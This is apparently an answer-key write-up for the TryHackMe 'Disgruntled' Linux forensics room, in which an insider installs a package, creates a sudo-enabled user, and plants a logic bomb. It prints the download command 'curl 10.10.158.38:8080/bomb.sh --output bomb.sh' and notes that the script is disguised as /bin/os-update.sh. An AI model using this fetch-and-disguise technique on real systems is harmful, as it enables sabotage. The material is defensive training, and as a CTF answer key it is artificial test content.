# Disgruntled

<Image src="https://tryhackme-images.s3.amazonaws.com/room-icons/03de138b8dfa8f5b003298c17b73fbd8.png" width="128" />

### Task 1 Introduction

> Grab a cup of coffee.

No answer needed

### Task 2 Linux Forensics review

> Take a sip of coffee.

No answer needed

### Task 3 Nothing suspicious... So far

> The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?

/usr/bin/apt install dokuwiki

> What was the present working directory (PWD) when the previous command was run?

/home/cybert

### Task 4 Let’s see if you did anything bad

> Which user was created after the package from the previous task was installed?

it-admin

> A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)

Dec 28 06:27:34

> A script file was opened using the "vi" text editor. What is the name of this file?

bomb.sh

### Task 5 Bomb has been planted. But when and where?

> What is the command used that created the file bomb.sh?

curl 10.10.158.38:8080/bomb.sh --output bomb.sh

> The file was renamed and moved to a different directory. What is the full path of this file now?

/bin/os-update.sh

> When was the file from the previous question last modified? (Format: Month Day HH:MM)

Dec 28 06:29

> What is the name of the file that will get created when the file from the first question executes?

goodbye.txt

### Task 6 Following the fuse

> At what time will the malicious file trigger? (Format: HH:MM AM/PM)

08:00 AM

### Task 7 Conclusion

> I’m kidding, of course! But you did good, kid.

No answer needed
